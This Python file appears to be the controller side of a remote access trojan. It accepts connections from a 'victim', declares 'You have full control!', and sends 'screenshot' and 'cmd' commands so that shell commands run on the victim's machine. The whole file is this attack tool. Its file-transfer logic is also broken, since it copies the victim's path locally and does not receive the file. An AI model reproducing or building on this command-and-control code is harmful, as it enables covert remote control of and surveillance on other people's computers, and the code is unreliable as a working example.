import socket
import shutil
import os

HOST = '127.0.0.1'
PORT = 8080
BUFFER_SIZE = 4096
HASH = 'utf-8'

def get_screenshot(victim_socket):
    filename = victim_socket.recv(BUFFER_SIZE).decode(HASH)
    fileToUpload = os.path.basename(filename)
    destination_path = os.path.join('MASTER_FOLDER', fileToUpload)
    shutil.copy(filename, destination_path)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as master_socket:
        master_socket.bind((HOST, PORT))
        master_socket.listen()
        print(f"master is up!\nlistening for any connections on port {PORT}...")
        while True:
            connection, address = master_socket.accept()
            print(f"victim found!\nconnected to {address}...")
            connection.send("connected?".encode(HASH))
            print("MASTER: connected?")
            print("VICTIM: "+connection.recv(BUFFER_SIZE).decode(HASH))
            
            print("You have full control!")
            while True:
                command = input("Enter a command: ")
                if command == "screenshot":
                    connection.send(command.encode(HASH))
                    get_screenshot(connection)
                    print("screenshot was taken...")
                elif command == "cmd":
                    connection.send(command.encode(HASH))
                    print(connection.recv(BUFFER_SIZE).decode(HASH))
                    cmd_command = input("Enter a cmd command: ")
                    connection.send(cmd_command.encode(HASH))
                    get_screenshot(connection)
                    print("screenshot was taken...")
                else:
                    break
            break
                    
if __name__ == '__main__':
    main()